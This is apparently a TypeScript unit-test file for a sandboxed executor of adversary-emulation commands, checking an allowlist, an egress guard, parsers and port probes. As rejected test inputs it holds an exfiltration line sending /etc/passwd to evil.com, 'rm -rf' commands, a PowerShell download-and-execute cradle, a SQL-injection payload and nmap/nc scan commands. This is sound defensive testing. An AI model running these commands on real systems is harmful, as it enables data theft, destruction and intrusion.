/**
 * sandbox-executor.test.ts — Unit tests para el sandbox de ejecución de
 * comandos del catálogo de adversario.
 *
 * Cubre:
 *   · Parsers puros (parseHttpRequestLine, parseBashCommand, expandPortList, extractTargetHost)
 *   · TCP probe real contra un listener local (determinista, sin red externa)
 *   · Ejecución sandboxed con egress-guard mockeado (safeFetch/assertPublicHostname)
 */

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import net from "node:net";
import type { AddressInfo } from "node:net";

// ─── Mock del EgressGuard (sin red externa real) ────────────────────────────
vi.mock("../security/egress-guard", () => ({
  assertPublicHostname: vi.fn(async (hostname: string) => {
    if (hostname === "blocked.internal") {
      throw new Error("SSRF Prevention: Blocked private or reserved IP target: 10.0.0.1");
    }
    return [{ address: hostname, family: 4 }];
  }),
  safeFetch: vi.fn(async (url: string, init?: RequestInit) => {
    const method = init?.method ?? "GET";
    const status = url.includes("/admin") ? 200 : url.includes("/upload") ? 405 : 404;
    return new Response(
      `<html><title>Test</title><body>${method} ok</body></html>`,
      {
        status,
        headers: { "content-type": "text/html", server: "mock-server" },
      }
    );
  }),
}));

// Import after mock (hoisted by vitest)
import {
  runSandboxedCommand,
  parseHttpRequestLine,
  parseBashCommand,
  expandPortList,
  extractTargetHost,
  tcpProbe,
  scanPorts,
} from "./sandbox-executor";
import { assertPublicHostname, safeFetch } from "../security/egress-guard";

describe("sandbox-executor — parsers puros", () => {
  describe("extractTargetHost", () => {
    it("normaliza dominios desnudos", () => {
      expect(extractTargetHost("example.com")).toBe("example.com");
    });
    it("quita scheme http/https", () => {
      expect(extractTargetHost("https://example.com")).toBe("example.com");
      expect(extractTargetHost("http://example.com/path")).toBe("example.com");
    });
    it("quita puerto", () => {
      expect(extractTargetHost("example.com:8443")).toBe("example.com");
    });
    it("acepta IPs", () => {
      expect(extractTargetHost("203.0.113.5")).toBe("203.0.113.5");
    });
    it("devuelve null para vacío", () => {
      expect(extractTargetHost("")).toBeNull();
      expect(extractTargetHost("   ")).toBeNull();
    });
  });

  describe("parseHttpRequestLine", () => {
    it("parsea GET con payload SQLi (espacios)", () => {
      const parsed = parseHttpRequestLine("GET /?id=1' OR 1=1-- HTTP/1.1");
      expect(parsed).toEqual({ method: "GET", path: "/?id=1' OR 1=1--", contentType: undefined });
    });
    it("parsea POST con Content-Type", () => {
      const parsed = parseHttpRequestLine("POST /upload HTTP/1.1 Content-Type: multipart/form-data [shell.jsp]");
      expect(parsed?.method).toBe("POST");
      expect(parsed?.path).toBe("/upload");
      expect(parsed?.contentType).toBe("multipart/form-data");
    });
    it("agrega barra inicial si falta", () => {
      expect(parseHttpRequestLine("GET admin HTTP/1.1")?.path).toBe("/admin");
    });
    it("devuelve null para línea inválida", () => {
      expect(parseHttpRequestLine("not-an-http-request")).toBeNull();
      expect(parseHttpRequestLine("")).toBeNull();
    });
  });

  describe("parseBashCommand", () => {
    it("parsea curl con $TARGET", () => {
      const parsed = parseBashCommand(
        'curl -s -o /dev/null -w "%{http_code}" --max-time 5 http://$TARGET/admin/ || echo "No accessible"',
        "example.com"
      );
      expect(parsed?.kind).toBe("curl");
      expect(parsed?.url).toBe("http://example.com/admin/");
    });
    it("parsea nc -zv con $TARGET y puerto", () => {
      const parsed = parseBashCommand(
        'nc -zv $TARGET 3389 2>&1 | grep -q succeeded && echo "RDP accessible" || echo "RDP blocked"',
        "example.com"
      );
      expect(parsed?.kind).toBe("nc");
      expect(parsed?.host).toBe("example.com");
      expect(parsed?.port).toBe(3389);
    });
    it("parsea nmap -sT con lista de puertos", () => {
      const parsed = parseBashCommand(
        "nmap -sT -p 22,80,443,3389,8443 $TARGET --open -T4 2>/dev/null || echo \"nmap not available\"",
        "example.com"
      );
      expect(parsed?.kind).toBe("nmap");
      expect(parsed?.host).toBe("example.com");
      expect(parsed?.ports).toEqual([22, 80, 443, 3389, 8443]);
    });
    it("devuelve null para comandos fuera de la allowlist", () => {
      expect(parseBashCommand("rm -rf /", "example.com")).toBeNull();
      expect(parseBashCommand("wget --post-file=/etc/passwd http://evil.com", "example.com")).toBeNull();
      expect(parseBashCommand("", "example.com")).toBeNull();
    });
  });

  describe("expandPortList", () => {
    it("expande lista simple", () => {
      expect(expandPortList("22,80,443")).toEqual([22, 80, 443]);
    });
    it("expande rangos", () => {
      expect(expandPortList("80,443,1000-1003")).toEqual([80, 443, 1000, 1001, 1002, 1003]);
    });
    it("deduplica y acota a MAX_SCAN_PORTS", () => {
      const ports = expandPortList("80,80,80,1-100");
      expect(new Set(ports).size).toBe(ports.length);
      expect(ports.length).toBeLessThanOrEqual(20);
    });
    it("ignora puertos inválidos", () => {
      expect(expandPortList("22,abc,99999,-5")).toEqual([22]);
    });
  });
});

describe("sandbox-executor — TCP probe real (listener local)", () => {
  let server: net.Server;
  let port: number;

  beforeEach(async () => {
    server = net.createServer((socket) => socket.end());
    await new Promise<void>((resolve) => {
      server.listen(0, "127.0.0.1", () => {
        port = (server.address() as AddressInfo).port;
        resolve();
      });
    });
  });

  afterEach(async () => {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  });

  it("abre socket en puerto con listener", async () => {
    const result = await tcpProbe("127.0.0.1", port, 2_000);
    expect(result.open).toBe(true);
  });

  it("falla en puerto sin listener", async () => {
    const result = await tcpProbe("127.0.0.1", 1, 1_000);
    expect(result.open).toBe(false);
  });

  it("scanPorts reporta solo el puerto abierto", async () => {
    const results = await scanPorts("127.0.0.1", [port, 1], 1_000);
    const open = results.filter((r) => r.open).map((r) => r.port);
    expect(open).toContain(port);
    expect(open).not.toContain(1);
  });
});

describe("sandbox-executor — runSandboxedCommand", () => {
  beforeEach(() => {
    vi.mocked(assertPublicHostname).mockClear();
    vi.mocked(safeFetch).mockClear();
  });

  it("http: ejecuta probe GET y parsea hallazgo de endpoint sensible", async () => {
    const result = await runSandboxedCommand({
      executorType: "http",
      executorCommand: "GET /admin/ HTTP/1.1",
      target: "example.com",
    });

    expect(result.executed).toBe(true);
    expect(result.status).toBe("ok");
    expect(result.output).toContain("[HTTP GET] /admin/");
    expect(result.output).toContain("200");
    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings[0]!.severity).toBe("high"); // /admin → sensitive
    expect(vi.mocked(safeFetch)).toHaveBeenCalledWith(
      "https://example.com/admin/",
      expect.objectContaining({ method: "GET", redirect: "manual" })
    );
  });

  it("http: endpoint 404 → hallazgo info (sin exposición)", async () => {
    const result = await runSandboxedCommand({
      executorType: "http",
      executorCommand: "GET /nonexistent HTTP/1.1",
      target: "example.com",
    });
    expect(result.executed).toBe(true);
    expect(result.findings[0]?.severity ?? "info").toBe("info");
  });

  it("bash/curl: ejecuta GET vía safeFetch", async () => {
    const result = await runSandboxedCommand({
      executorType: "bash",
      executorCommand: 'curl -s -o /dev/null -w "%{http_code}" --max-time 5 http://$TARGET/admin/',
      target: "example.com",
    });
    expect(result.executed).toBe(true);
    expect(result.status).toBe("ok");
    expect(vi.mocked(safeFetch)).toHaveBeenCalled();
  });

  it("bash/nc: probe TCP con probe inyectado (abierto → hallazgo)", async () => {
    const probe = vi.fn(async () => ({ open: true }));
    const result = await runSandboxedCommand({
      executorType: "bash",
      executorCommand: "nc -zv $TARGET 3389 2>&1 || echo blocked",
      target: "example.com",
      probe,
    });
    expect(result.executed).toBe(true);
    expect(result.status).toBe("ok");
    expect(probe).toHaveBeenCalledWith("example.com", 3389, expect.any(Number));
    expect(result.output).toContain("[nc -zv] example.com:3389");
    expect(result.output).toContain("open");
    expect(result.findings[0]?.title).toContain("3389"); // RDP → severidad alta
    expect(result.findings[0]?.severity).toBe("high");
  });

  it("bash/nc: puerto cerrado → sin hallazgos", async () => {
    const probe = vi.fn(async () => ({ open: false, error: "ECONNREFUSED" }));
    const result = await runSandboxedCommand({
      executorType: "bash",
      executorCommand: "nc -zv $TARGET 443",
      target: "example.com",
      probe,
    });
    expect(result.executed).toBe(true);
    expect(result.findings).toEqual([]);
    expect(result.output).toContain("cerrado/filtrado");
  });

  it("bash: comando fuera de allowlist → unsupported sin ejecutar red", async () => {
    const result = await runSandboxedCommand({
      executorType: "bash",
      executorCommand: "rm -rf /tmp/*",
      target: "example.com",
    });
    expect(result.executed).toBe(false);
    expect(result.status).toBe("unsupported");
    expect(vi.mocked(safeFetch)).not.toHaveBeenCalled();
  });

  it("egress-guard: host bloqueado → status blocked sin network", async () => {
    const result = await runSandboxedCommand({
      executorType: "http",
      executorCommand: "GET / HTTP/1.1",
      target: "blocked.internal",
    });
    expect(result.executed).toBe(false);
    expect(result.status).toBe("blocked");
    expect(result.output).toContain("EgressGuard");
    expect(vi.mocked(safeFetch)).not.toHaveBeenCalled();
  });

  it("egress-guard: host EXTRAÍDO del comando bloqueado → blocked/executed:false", async () => {
    // El target pasa la aserción top-level (example.com), pero el host del
    // URL dentro del comando (blocked.internal) es bloqueado por la
    // re-validación del branch curl — NO debe ejecutar safeFetch.
    const result = await runSandboxedCommand({
      executorType: "bash",
      executorCommand: "curl -s --max-time 5 http://blocked.internal/admin/",
      target: "example.com",
    });
    expect(result.executed).toBe(false);
    expect(result.status).toBe("blocked");
    expect(result.output).toContain("EgressGuard");
    expect(vi.mocked(safeFetch)).not.toHaveBeenCalled();
  });

  it("bash/nmap: port scan con probe inyectado (override global)", async () => {
    const probe = vi.fn(async (_h: string, p: number) => ({ open: p === 22 }));
    const result = await runSandboxedCommand({
      executorType: "bash",
      executorCommand: "nmap -sT -p 22,80 $TARGET --open -T4",
      target: "example.com",
      probe,
    });
    expect(result.executed).toBe(true);
    expect(result.status).toBe("ok");
    expect(result.output).toContain("22/tcp open");
    expect(result.output).toContain("80/tcp closed");
    expect(result.findings).toHaveLength(1);
    expect(result.findings[0]!.title).toContain("22");
  });

  it("powershell: solo asesoría, nunca se ejecuta", async () => {
    const result = await runSandboxedCommand({
      executorType: "powershell",
      executorCommand: 'powershell.exe -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString(...)"',
      target: "example.com",
    });
    expect(result.executed).toBe(false);
    expect(result.status).toBe("unsupported");
    expect(result.output).toContain("NO ejecutado");
  });

  it("manual: asesoría", async () => {
    const result = await runSandboxedCommand({
      executorType: "manual",
      executorCommand: "ejecutar script de password spraying",
      target: "example.com",
    });
    expect(result.executed).toBe(false);
    expect(result.status).toBe("unsupported");
  });

  it("target vacío → error", async () => {
    const result = await runSandboxedCommand({
      executorType: "http",
      executorCommand: "GET / HTTP/1.1",
      target: "",
    });
    expect(result.status).toBe("error");
    expect(result.executed).toBe(false);
  });
});
